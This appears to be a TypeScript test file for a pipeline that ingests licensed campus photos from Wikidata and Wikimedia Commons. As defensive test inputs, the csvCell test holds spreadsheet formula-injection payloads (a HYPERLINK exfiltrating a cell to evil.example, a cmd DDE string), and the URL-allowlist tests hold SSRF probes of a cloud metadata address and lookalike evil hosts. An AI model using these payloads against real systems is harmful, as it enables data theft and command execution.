import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import {
  allowedLicense,
  candidateTextHash,
  choosePhoto,
  csvCell,
  isoTime,
  nextCandidate,
  reviewDecision,
  stableSince,
  type ChosenPhoto,
  type PhotoCandidate,
  fileTitleFromUri,
  loadPicks,
  normalizeTitle,
  parsePicks,
  parseSparql,
  resolvePages,
  storagePaths,
  stripHtml,
  thumbUrlOf,
  CREDIT_MAX,
  STABLE_MS,
} from "../../src/lib/ingest/collegePhotos.js";
import { isAllowedDownloadUrl, isJpeg, readJpeg, wikimediaClient, USER_AGENT } from "../../src/lib/ingest/wikimedia.js";

const dir = new URL("../fixtures/college-photos/", import.meta.url);
const fixture = (name: string) => JSON.parse(readFileSync(new URL(name, dir), "utf8")) as unknown;
const tiny = new Uint8Array(readFileSync(new URL("tiny.jpg", dir)));

// ---- Licenses and credits ----------------------------------------------------------

test("allowedLicense: CC0, public domain, CC BY and CC BY-SA in; NC, ND, GFDL and blanks out", () => {
  for (const ok of ["CC0", "Public domain", "PD-US", "PD", "CC BY 2.0", "CC BY 3.0", "CC BY 4.0", "CC BY-SA 2.5", "CC BY-SA 4.0", "CC BY-SA 3.0 de", "cc by-sa 4.0"]) {
    assert.equal(allowedLicense(ok), true, ok);
  }
  for (const no of ["CC BY-NC 4.0", "CC BY-NC-SA 2.0", "CC BY-ND 2.0", "CC BY-NC-ND 3.0", "GFDL", "", null, undefined, "All rights reserved", "CC-BY-SA-4.0", "PDF", "x".repeat(70)]) {
    assert.equal(allowedLicense(no as string | null | undefined), false, String(no));
  }
});

test("stripHtml: tags out, entities decoded, whitespace and control characters collapsed", () => {
  assert.equal(stripHtml('<a href="//commons.wikimedia.org/wiki/User:X" title="User:X">Jos&eacute; &amp; Co.</a>'), "Jos&eacute; & Co.");
  assert.equal(stripHtml("<span>Ana&#39;s&#x20;photo</span>\n\n  <b>2021</b>"), "Ana's photo 2021");
  assert.equal(stripHtml("A&nbsp;B &lt;C&gt; &quot;D&quot;"), 'A B <C> "D"');
  assert.equal(stripHtml("a\u0000b​c"), "a b c");
  assert.equal(stripHtml(null), "");
  assert.equal(stripHtml(42), "");
});

// ---- Titles and Wikidata -------------------------------------------------------------

test("csvCell: a cell a spreadsheet would run as a formula is defused, then quoted as usual", () => {
  assert.equal(csvCell('=HYPERLINK("https://evil.example/?"&A2,"Photographer")'), `"'=HYPERLINK(""https://evil.example/?""&A2,""Photographer"")"`);
  for (const lead of ["=", "+", "-", "@", "\t", "\r", "  ="]) {
    assert.ok(csvCell(`${lead}1+1`).replace(/^"/, "").startsWith("'"), JSON.stringify(lead));
  }
  assert.equal(csvCell("@cmd|' /C calc'!A0"), "'@cmd|' /C calc'!A0");
  assert.equal(csvCell("José & Co."), "José & Co.");
  assert.equal(csvCell("Smith, Jane"), '"Smith, Jane"');
  assert.equal(csvCell("a\nb"), '"a\nb"');
  assert.equal(csvCell(166683), "166683");
  assert.equal(csvCell("File:A-B.jpg"), "File:A-B.jpg", "a dash inside is left alone");
});

test("normalizeTitle: MediaWiki's form, and refusal of what can't be a title", () => {
  assert.equal(normalizeTitle("File:Great_dome_of_MIT,_Feb_2021.jpg"), "File:Great dome of MIT, Feb 2021.jpg");
  assert.equal(normalizeTitle("file:  lower case.jpg "), "File:Lower case.jpg");
  assert.equal(normalizeTitle("Image:Old namespace.jpg"), "File:Old namespace.jpg");
  assert.equal(normalizeTitle("No namespace.jpg"), "File:No namespace.jpg");
  for (const bad of ["", "File:", "File:a|b.jpg", "File:a#b.jpg", "File:a\u0001.jpg", "File:a<b>.jpg", `File:${"x".repeat(400)}`]) {
    assert.equal(normalizeTitle(bad), null, bad);
  }
});

test("fileTitleFromUri: Special:FilePath URIs decoded, anything else refused", () => {
  assert.equal(fileTitleFromUri("http://commons.wikimedia.org/wiki/Special:FilePath/Great%20dome%20of%20MIT%2C%20Feb%202021.jpg"), "File:Great dome of MIT, Feb 2021.jpg");
  assert.equal(fileTitleFromUri("http://commons.wikimedia.org/wiki/Special:FilePath/Sather_Tower_%C3%A9t%C3%A9.jpg"), "File:Sather Tower été.jpg");
  assert.equal(fileTitleFromUri("https://commons.wikimedia.org/wiki/Special:FilePath/x.jpg"), "File:X.jpg");
  assert.equal(fileTitleFromUri("http://commons.wikimedia.org/wiki/Special:FilePath/%E0%A4%A"), null, "bad percent-encoding");
  assert.equal(fileTitleFromUri("http://example.com/wiki/Special:FilePath/x.jpg"), null);
  assert.equal(fileTitleFromUri("http://commons.wikimedia.org/wiki/Special:FilePath/a%7Cb.jpg"), null, "a pipe");
  assert.equal(fileTitleFromUri(undefined), null);
});

test("parseSparql: one item per unitid, padded ids trimmed, bad ids and shared items skipped, images sorted", () => {
  const r = parseSparql(fixture("wdqs-p1771.json"));
  assert.deepEqual(r.byUnitid.get(166683), { qid: "Q49108", titles: ["File:Great dome of MIT, Feb 2021.jpg"], modified: "2026-08-01T09:30:00.000Z" });
  assert.equal(r.byUnitid.get(110635)?.qid, "Q168756", "a padded unitid is trimmed");
  assert.equal(r.byUnitid.get(110635)?.titles[0], "File:Sather Tower été.jpg", "the title is passed on for Commons to normalize");
  assert.deepEqual(r.byUnitid.get(130794), { qid: "Q49112", titles: [], modified: "2026-08-01T09:30:00.000Z" }, "no image");
  assert.deepEqual(r.byUnitid.get(217156)?.titles, ["File:Aerial view of Brown University.jpg", "File:Richardsonian Romanesque Brown.jpg"]);
  assert.ok(r.ambiguous.has(190415), "a unitid on two items");
  assert.ok(r.ambiguous.has(199998) && r.ambiguous.has(199999), "an item claiming two unitids");
  assert.ok(!r.byUnitid.has(190415) && !r.byUnitid.has(199998));
  assert.equal(r.invalid, 1, "the five-digit id");
  assert.equal(r.byUnitid.has(12345), false);
});

test("parseSparql: when the item was last edited, the latest across its rows; unknown is null", () => {
  const b = (q: string, unitid: string, modified?: string) => ({
    item: { value: `http://www.wikidata.org/entity/${q}` },
    unitid: { value: unitid },
    ...(modified !== undefined ? { modified: { value: modified } } : {}),
  });
  const r = parseSparql({
    results: { bindings: [b("Q1", "100001", "2026-01-01T00:00:00Z"), b("Q1", "100001", "2026-03-01T00:00:00Z"), b("Q2", "100002"), b("Q3", "100003", "yesterday")] },
  });
  assert.equal(r.byUnitid.get(100001)?.modified, "2026-03-01T00:00:00.000Z");
  assert.equal(r.byUnitid.get(100002)?.modified, null);
  assert.equal(r.byUnitid.get(100003)?.modified, null, "an unreadable time is unknown, never stable");
});

test("isoTime: ISO date-times only", () => {
  assert.equal(isoTime("2026-10-14T12:00:00Z"), "2026-10-14T12:00:00.000Z");
  assert.equal(isoTime("2026-10-14T12:00:00+02:00"), "2026-10-14T10:00:00.000Z");
  for (const bad of ["2026-10-14", "yesterday", "", 1760443200, null, undefined, "2026-13-45T99:99:99Z"]) assert.equal(isoTime(bad), null, String(bad));
});

test("parseSparql: a document that isn't a results set throws (the run stops touching nothing)", () => {
  assert.throws(() => parseSparql({}), /no results/);
  assert.throws(() => parseSparql(null), /no results/);
  assert.equal(parseSparql({ results: { bindings: [] } }).byUnitid.size, 0);
});

// ---- Picks ---------------------------------------------------------------------------

test("parsePicks: titles normalized, none suppresses, quoted commas kept", () => {
  const p = parsePicks(readFileSync(new URL("picks.csv", dir), "utf8"));
  assert.equal(p.get(243744), "File:Stanford Memorial Church (2025)-L1007381.jpg");
  assert.equal(p.get(196097), "none");
  assert.equal(p.size, 3);
  const q = parsePicks('unitid,commons_title,note\n170976,"File:Law_Quadrangle,_University_of_Michigan.jpg",\n');
  assert.equal(q.get(170976), "File:Law Quadrangle, University of Michigan.jpg");
});

test("parsePicks: one bad row fails the whole file", () => {
  const good = "unitid,commons_title,note\n166683,File:A.jpg,ok\n";
  assert.throws(() => parsePicks(good + "12345,File:B.jpg,\n"), /six digits/);
  assert.throws(() => parsePicks(good + "166683,File:C.jpg,\n"), /twice/);
  assert.throws(() => parsePicks(good + "243744,Stanford.jpg,\n"), /File: title or none/);
  assert.throws(() => parsePicks(good + "243744,File:a|b.jpg,\n"), /File: title or none/);
  assert.throws(() => parsePicks(good + "243744,,\n"), /empty/);
  assert.throws(() => parsePicks("id,title\n166683,File:A.jpg\n"), /header/);
});

test("the checked-in picks file parses, and every pick is a title or none", () => {
  const picks = loadPicks();
  assert.ok(picks.size >= 43, `has ${picks.size}`);
  for (const [unitid, t] of picks) {
    assert.ok(unitid >= 100000 && unitid <= 999999);
    assert.ok(t === "none" || t.startsWith("File:"), t);
  }
  assert.equal(picks.get(166683), "File:Great dome of MIT, Feb 2021.jpg");
});

// ---- Commons -------------------------------------------------------------------------

const full = fixture("commons-imageinfo-1280.json");
const pageFor = (title: string) => resolvePages(full, [title]).get(title);

test("resolvePages: a normalized title and a moved file both find their page", () => {
  const redirected = new Set<string>();
  const m = resolvePages(full, ["File:Sather Tower été.jpg", "File:College Hall Penn old name.jpg", "File:Not in the answer.jpg"], redirected);
  assert.deepEqual([...redirected], ["File:College Hall Penn old name.jpg"], "only the move counts as a redirect, not normalization");
  assert.equal(m.get("File:Sather Tower été.jpg")?.title, "File:Sather Tower été.jpg");
  assert.equal(m.get("File:College Hall Penn old name.jpg")?.title, "File:College Hall, University of Pennsylvania.jpg");
  assert.equal(m.get("File:Not in the answer.jpg"), null);
  assert.throws(() => resolvePages({}, ["File:A.jpg"]), /no query/);
});

test("choosePhoto: an accepted file carries everything attribution needs", () => {
  const r = choosePhoto(pageFor("File:Great dome of MIT, Feb 2021.jpg"));
  assert.ok(r.ok);
  if (!r.ok) return;
  assert.equal(r.photo.title, "File:Great dome of MIT, Feb 2021.jpg");
  assert.equal(r.photo.credit, "José & Co.");
  assert.equal(r.photo.license, "CC BY-SA 4.0");
  assert.equal(r.photo.licenseUrl, "https://creativecommons.org/licenses/by-sa/4.0");
  assert.match(r.photo.sourceUrl, /^https:\/\/commons\.wikimedia\.org\/wiki\/File:/);
  assert.match(r.photo.sha1, /^[0-9a-f]{40}$/);
  assert.match(r.photo.fullUrl, /^https:\/\/upload\.wikimedia\.org\/.*\/1280px-/);
  assert.equal(r.photo.width, 1280);
  assert.equal(r.photo.height, 853);
  assert.equal(r.photo.uploadedAt, "2021-01-10T12:00:00.000Z", "the current version's upload time");
  assert.equal(r.photo.pageEditedAt, "2026-06-01T08:00:00.000Z", "the description page's latest revision");
});

test("choosePhoto: a page without its times is still a candidate, with the times unknown", () => {
  const page = structuredClone(pageFor("File:Great dome of MIT, Feb 2021.jpg")!) as Record<string, unknown> & { imageinfo: Record<string, unknown>[] };
  delete page.revisions;
  delete page.imageinfo[0]!.timestamp;
  const r = choosePhoto(page);
  assert.ok(r.ok && r.photo.uploadedAt === null && r.photo.pageEditedAt === null);
});

// ---- The review gate ---------------------------------------------------------------------

const NOW = new Date("2026-10-15T00:00:00Z");
const ago = (days: number) => new Date(NOW.getTime() - days * 86_400_000).toISOString();
const photo = (over: Partial<ChosenPhoto> = {}): ChosenPhoto => ({
  title: "File:Campus.jpg", sha1: "a".repeat(40), width: 1280, height: 853, credit: "Someone", license: "CC BY 4.0",
  licenseUrl: null, sourceUrl: "https://commons.wikimedia.org/wiki/File:Campus.jpg", fullUrl: "https://upload.wikimedia.org/x.jpg",
  uploadedAt: ago(400), pageEditedAt: ago(60), ...over,
});
const decide = (over: Partial<Parameters<typeof reviewDecision>[0]> = {}) =>
  reviewDecision({ source: "wikidata", photo: photo(), itemModified: ago(30), redirected: false, prev: undefined, candidate: undefined, candidatesAvailable: true, now: NOW, ...over });
const seen = (p: ChosenPhoto, daysAgo: number, over: Partial<PhotoCandidate> = {}): PhotoCandidate => ({
  college_id: "c1", source: "wikidata", commons_title: p.title, commons_sha1: p.sha1, text_hash: candidateTextHash(p),
  reasons: ["replacement"], first_seen_at: ago(daysAgo), last_seen_at: ago(daysAgo), ...over,
});

test("stableSince: a week or more before now; unknown and future times never", () => {
  assert.equal(stableSince(ago(7), NOW), true);
  assert.equal(stableSince(new Date(NOW.getTime() - STABLE_MS + 1000).toISOString(), NOW), false);
  assert.equal(stableSince(null, NOW), false);
  assert.equal(stableSince("2099-01-01T00:00:00Z", NOW), false);
  assert.equal(stableSince("garbage", NOW), false);
});

test("reviewDecision: a new photo quiet for a week on Wikidata and Commons is published at once", () => {
  assert.deepEqual(decide(), { publish: true, via: "stable" });
});

test("reviewDecision: each recent edit holds a new photo, and says which", () => {
  assert.deepEqual(decide({ itemModified: ago(1) }), { publish: false, reasons: ["wikidata-recent"] });
  assert.deepEqual(decide({ itemModified: null }), { publish: false, reasons: ["wikidata-recent"] });
  assert.deepEqual(decide({ photo: photo({ uploadedAt: ago(2) }) }), { publish: false, reasons: ["file-recent"] });
  assert.deepEqual(decide({ photo: photo({ uploadedAt: null }) }), { publish: false, reasons: ["file-recent"] });
  assert.deepEqual(decide({ photo: photo({ pageEditedAt: ago(0) }) }), { publish: false, reasons: ["page-recent"] });
  assert.deepEqual(decide({ redirected: true }), { publish: false, reasons: ["redirected"] });
});

test("reviewDecision: a replacement always needs a sighting at least a week old, of exactly this candidate", () => {
  const prev = { source: "wikidata" as const, commons_title: "File:Campus.jpg", commons_sha1: "b".repeat(40) };
  assert.deepEqual(decide({ prev }), { publish: false, reasons: ["replacement"] });
  const p = photo();
  assert.deepEqual(decide({ prev, candidate: seen(p, 7) }), { publish: true, via: "observed" });
  assert.deepEqual(decide({ prev, candidate: seen(p, 6) }), { publish: false, reasons: ["replacement"] }, "six days");
  assert.equal(decide({ prev, candidate: seen(p, 9, { commons_sha1: "c".repeat(40) }) }).publish, false, "another version");
  assert.equal(decide({ prev, candidate: seen(p, 9, { commons_title: "File:Other.jpg" }) }).publish, false, "another file");
  assert.equal(decide({ prev, candidate: seen(p, 9, { text_hash: candidateTextHash({ ...p, credit: "Someone else" }) }) }).publish, false, "the credit was edited");
  assert.equal(decide({ prev, candidate: seen(p, 9, { source: "pick" }) }).publish, false, "seen as a pick");
  assert.equal(decide({ prev, candidate: seen(p, 9), candidatesAvailable: false }).publish, false);
});

test("reviewDecision: a sighting a week old stands in for every clock", () => {
  const p = photo({ uploadedAt: ago(1), pageEditedAt: ago(1) });
  assert.deepEqual(decide({ photo: p, itemModified: ago(1), redirected: true, candidate: seen(p, 8) }), { publish: true, via: "observed" });
});

test("reviewDecision: a team pick is published at once, unless a new version was uploaded over the picked file", () => {
  const fresh = photo({ uploadedAt: ago(0), pageEditedAt: ago(0) });
  assert.deepEqual(decide({ source: "pick", photo: fresh, itemModified: ago(0), redirected: true }), { publish: true, via: "pick" });
  const wikidataPrev = { source: "wikidata" as const, commons_title: "File:Campus.jpg", commons_sha1: "b".repeat(40) };
  assert.deepEqual(decide({ source: "pick", photo: fresh, prev: wikidataPrev }), { publish: true, via: "pick" }, "a pick replaces Wikidata's photo at once");
  const pickPrev = { source: "pick" as const, commons_title: "File:Campus.jpg", commons_sha1: "b".repeat(40) };
  assert.deepEqual(decide({ source: "pick", photo: fresh, prev: pickPrev, itemModified: ago(0) }), { publish: false, reasons: ["file-recent", "page-recent", "replacement"] }, "the Wikidata clock doesn't apply to a pick");
  assert.deepEqual(decide({ source: "pick", photo: photo(), prev: pickPrev, candidate: seen(photo(), 8, { source: "pick" }) }), { publish: true, via: "observed" });
});

test("reviewDecision: without the review queue a replacement says it can't be confirmed", () => {
  const prev = { source: "wikidata" as const, commons_title: "File:Campus.jpg", commons_sha1: "b".repeat(40) };
  assert.deepEqual(decide({ prev, candidatesAvailable: false }), { publish: false, reasons: ["replacement", "no-review-table"] });
  assert.deepEqual(decide({ candidatesAvailable: false }), { publish: true, via: "stable" }, "a new, quiet photo doesn't need the queue");
});

test("nextCandidate: the wait counts from the first sighting of the same candidate, and restarts on any change", () => {
  const p = photo();
  const first = nextCandidate("c1", "wikidata", p, ["replacement"], undefined, NOW);
  assert.equal(first.first_seen_at, NOW.toISOString());
  const later = new Date(NOW.getTime() + 3 * 86_400_000);
  assert.equal(nextCandidate("c1", "wikidata", p, ["replacement"], first, later).first_seen_at, NOW.toISOString());
  assert.equal(nextCandidate("c1", "wikidata", p, ["replacement"], first, later).last_seen_at, later.toISOString());
  assert.equal(nextCandidate("c1", "wikidata", photo({ sha1: "d".repeat(40) }), ["replacement"], first, later).first_seen_at, later.toISOString());
  assert.equal(nextCandidate("c1", "wikidata", photo({ credit: "Other" }), ["replacement"], first, later).first_seen_at, later.toISOString());
  const past = new Date(NOW.getTime() - 86_400_000);
  assert.equal(nextCandidate("c1", "wikidata", p, ["replacement"], first, past).first_seen_at, past.toISOString(), "a clock that went back starts afresh");
});

test("choosePhoto: each refusal has its reason", () => {
  const cases: [string, string][] = [
    ["File:Columbia University seal.png", "mime"],
    ["File:Baker Library tower portrait.jpg", "size"],
    ["File:Packer Chapel NC.jpg", "license"],
    ["File:Ballou Hall with students.jpg", "restricted"],
    ["File:Vassar nonfree.jpg", "nonfree"],
    ["File:Bucknell no credit.jpg", "no-credit"],
    ["File:Nott Memorial deleted.jpg", "missing"],
    ["File:Hamilton long credit.jpg", "credit-too-long"],
  ];
  for (const [title, reason] of cases) {
    const r = choosePhoto(pageFor(title));
    assert.deepEqual(r, { ok: false, reason }, title);
  }
  assert.deepEqual(choosePhoto(null), { ok: false, reason: "missing" });
});

test("choosePhoto: a long credit is refused, never clipped", () => {
  const r = choosePhoto(pageFor("File:Hamilton long credit.jpg"));
  assert.equal(r.ok, false);
  assert.ok(stripHtml("A very long credit line ".repeat(30)).length > CREDIT_MAX);
});

test("choosePhoto: public domain with no author is credited as unknown; Attribution wins over Artist", () => {
  const pd = choosePhoto(pageFor("File:Rush Rhees PD.jpg"));
  assert.ok(pd.ok && pd.photo.credit === "Unknown author" && pd.photo.licenseUrl === null);
  const attr = choosePhoto(pageFor("File:Swarthmore Parrish Hall.jpg"));
  assert.ok(attr.ok && attr.photo.credit === "Photo by Swat Photographer, Swarthmore College");
});

test("choosePhoto: a team pick may be narrow or portrait, but still has to be a free JPEG", () => {
  const page = pageFor("File:Binghamton University Downtown Campus.jpg");
  assert.deepEqual(choosePhoto(page), { ok: false, reason: "size" });
  const picked = choosePhoto(page, { picked: true });
  assert.ok(picked.ok);
  if (picked.ok) {
    assert.equal(picked.photo.width, 800, "narrower than 1280: the original is the copy");
    assert.match(picked.photo.fullUrl, /^https:\/\/upload\.wikimedia\.org\/wikipedia\/commons\/[0-9a-f]\//);
  }
  assert.deepEqual(choosePhoto(pageFor("File:Packer Chapel NC.jpg"), { picked: true }), { ok: false, reason: "license" });
  assert.deepEqual(choosePhoto(pageFor("File:Columbia University seal.png"), { picked: true }), { ok: false, reason: "mime" });
});

test("choosePhoto: metadata pointing off Commons is refused", () => {
  const page = structuredClone(pageFor("File:Great dome of MIT, Feb 2021.jpg")) as { imageinfo: Record<string, unknown>[] };
  page.imageinfo[0]!.thumburl = "https://upload.wikimedia.org.evil.example/x.jpg";
  assert.deepEqual(choosePhoto(page as never), { ok: false, reason: "bad-metadata" });
  const page2 = structuredClone(pageFor("File:Great dome of MIT, Feb 2021.jpg")) as { imageinfo: Record<string, unknown>[] };
  page2.imageinfo[0]!.descriptionurl = "https://example.com/File:x";
  assert.deepEqual(choosePhoto(page2 as never), { ok: false, reason: "bad-metadata" });
  const page3 = structuredClone(pageFor("File:Great dome of MIT, Feb 2021.jpg")) as { imageinfo: Record<string, unknown>[] };
  page3.imageinfo[0]!.sha1 = "not-a-sha1";
  assert.deepEqual(choosePhoto(page3 as never), { ok: false, reason: "bad-metadata" });
});

test("thumbUrlOf reads the 500 px URL and refuses another host", () => {
  const thumbs = fixture("commons-imageinfo-500.json");
  const t = "File:Great dome of MIT, Feb 2021.jpg";
  assert.match(thumbUrlOf(resolvePages(thumbs, [t]).get(t)) ?? "", /\/500px-/);
  assert.equal(thumbUrlOf({ imageinfo: [{ thumburl: "https://evil.example/500px-x.jpg" }] } as never), null);
  assert.equal(thumbUrlOf(null), null);
});

test("storagePaths match the migration's CHECKs", () => {
  const sha = "0123456789abcdef0123456789abcdef01234567";
  const p = storagePaths(166683, sha);
  assert.match(p.full, /^[0-9]{6}\/[0-9a-f]{40}-1280\.jpg$/);
  assert.match(p.thumb, /^[0-9]{6}\/[0-9a-f]{40}-500\.jpg$/);
  assert.throws(() => storagePaths(12345, sha), /unitid/);
  assert.throws(() => storagePaths(166683, "../../x"), /sha1/);
});

// ---- The network client --------------------------------------------------------------

test("isAllowedDownloadUrl: upload.wikimedia.org over https and nothing else", () => {
  assert.equal(isAllowedDownloadUrl("https://upload.wikimedia.org/wikipedia/commons/a/ab/X.jpg"), true);
  for (const bad of [
    "http://upload.wikimedia.org/x.jpg",
    "https://upload.wikimedia.org.evil.com/x.jpg",
    "https://evil.com/upload.wikimedia.org/x.jpg",
    "https://user:pw@upload.wikimedia.org/x.jpg",
    "https://upload.wikimedia.org:8443/x.jpg",
    "https://commons.wikimedia.org/x.jpg",
    "not a url",
  ]) {
    assert.equal(isAllowedDownloadUrl(bad), false, bad);
  }
});

const jpegResponse = (bytes: Uint8Array, headers: Record<string, string> = {}) =>
  new Response(bytes, { status: 200, headers: { "content-type": "image/jpeg", ...headers } });

test("readJpeg: type, magic bytes and the byte cap", async () => {
  assert.deepEqual(await readJpeg(jpegResponse(tiny)), tiny);
  assert.equal(isJpeg(tiny), true);
  await assert.rejects(readJpeg(new Response(tiny, { headers: { "content-type": "image/png" } })), /not a JPEG/);
  await assert.rejects(readJpeg(jpegResponse(new Uint8Array([0x89, 0x50, 0x4e, 0x47]))), /not a JPEG/);
  await assert.rejects(readJpeg(jpegResponse(tiny, { "content-length": "99999999" })), /too large/);
  await assert.rejects(readJpeg(jpegResponse(tiny), 100), /too large/, "a body over the cap without a length header");
});

type Call = { url: string; init: RequestInit };
function fakeFetch(answers: (Response | Error)[]) {
  const calls: Call[] = [];
  const f = (async (url: string | URL, init: RequestInit = {}) => {
    calls.push({ url: String(url), init });
    const next = answers.shift();
    if (!next) throw new Error("no more answers");
    if (next instanceof Error) throw next;
    return next;
  }) as typeof fetch;
  return { f, calls };
}
const noSleep = async () => undefined;
const json = (body: unknown, status = 200, headers: Record<string, string> = {}) =>
  new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json", ...headers } });

test("the client: pinned hosts, our User-Agent, redirects refused, POSTed titles with redirects=1", async () => {
  const { f, calls } = fakeFetch([json({ results: { bindings: [] } }), json({ query: { pages: [] } }), jpegResponse(tiny)]);
  const wm = wikimediaClient({ fetch: f, sleep: noSleep, minGapMs: 0 });
  await wm.sparql();
  await wm.imageinfo(["File:A.jpg", "File:B, c.jpg"], 1280, true);
  await wm.download("https://upload.wikimedia.org/wikipedia/commons/a/ab/A.jpg");
  assert.match(calls[0]!.url, /^https:\/\/query\.wikidata\.org\/sparql\?query=.*P1771.*P18/);
  assert.equal(calls[1]!.url, "https://commons.wikimedia.org/w/api.php");
  const body = new URLSearchParams(String(calls[1]!.init.body));
  assert.equal(body.get("titles"), "File:A.jpg|File:B, c.jpg");
  assert.equal(body.get("redirects"), "1");
  assert.equal(body.get("maxlag"), "5");
  assert.equal(body.get("iiurlwidth"), "1280");
  assert.match(body.get("iiprop") ?? "", /sha1/);
  assert.match(body.get("iiprop") ?? "", /\btimestamp\b/, "the current version's upload time");
  assert.equal(body.get("prop"), "imageinfo|revisions");
  assert.equal(body.get("rvprop"), "timestamp", "the description page's latest edit, and nothing else of it");
  assert.match(decodeURIComponent(calls[0]!.url), /schema:dateModified/, "when each item was last edited");
  for (const c of calls) {
    assert.equal(c.init.redirect, "error");
    assert.equal((c.init.headers as Record<string, string>)["User-Agent"], USER_AGENT);
  }
  assert.match(USER_AGENT, /team@meridiesai\.com/);
});

test("the client: 429 and maxlag are retried, other errors carry the status only", async () => {
  const sleeps: number[] = [];
  const sleep = async (ms: number) => void sleeps.push(ms);
  const { f } = fakeFetch([
    new Response("slow down, here is a body", { status: 429, headers: { "retry-after": "3" } }),
    json({ error: { code: "maxlag", info: "Waiting for a database server" } }, 200, { "retry-after": "5" }),
    json({ query: { pages: [] } }),
  ]);
  const wm = wikimediaClient({ fetch: f, sleep, minGapMs: 0 });
  assert.deepEqual(await wm.imageinfo(["File:A.jpg"], 500, false), { query: { pages: [] } });
  assert.deepEqual(sleeps.filter((s) => s > 0), [3000, 5000]);

  const { f: f2 } = fakeFetch([new Response("secret echo", { status: 500 })]);
  await assert.rejects(wikimediaClient({ fetch: f2, sleep: noSleep, minGapMs: 0 }).sparql(), (e: Error) => e.message === "Wikidata returned 500");

  const { f: f3 } = fakeFetch([json({ error: { code: "badtitle<script>", info: "x" } })]);
  await assert.rejects(wikimediaClient({ fetch: f3, sleep: noSleep, minGapMs: 0 }).imageinfo(["File:A.jpg"], 500, false), (e: Error) => e.message === "Commons API error badtitlescript");
});

test("the client: a download off upload.wikimedia.org is refused before any request", async () => {
  const { f, calls } = fakeFetch([]);
  const wm = wikimediaClient({ fetch: f, sleep: noSleep, minGapMs: 0 });
  await assert.rejects(wm.download("https://upload.wikimedia.org.evil.com/x.jpg"), /refused/);
  await assert.rejects(wm.download("http://169.254.169.254/latest/meta-data"), /refused/);
  await assert.rejects(wm.imageinfo(["File:a|b.jpg"], 500, false), /pipe/);
  await assert.rejects(wm.imageinfo([], 500, false), /1 to 50/);
  assert.equal(calls.length, 0);
});

test("the client: API calls are spaced out", async () => {
  const sleeps: number[] = [];
  const { f } = fakeFetch([json({ query: { pages: [] } }), json({ query: { pages: [] } })]);
  const wm = wikimediaClient({ fetch: f, sleep: async (ms) => void sleeps.push(ms), minGapMs: 500 });
  await wm.imageinfo(["File:A.jpg"], 500, false);
  await wm.imageinfo(["File:B.jpg"], 500, false);
  assert.equal(sleeps.length, 1);
  assert.ok(sleeps[0]! > 400 && sleeps[0]! <= 500);
});
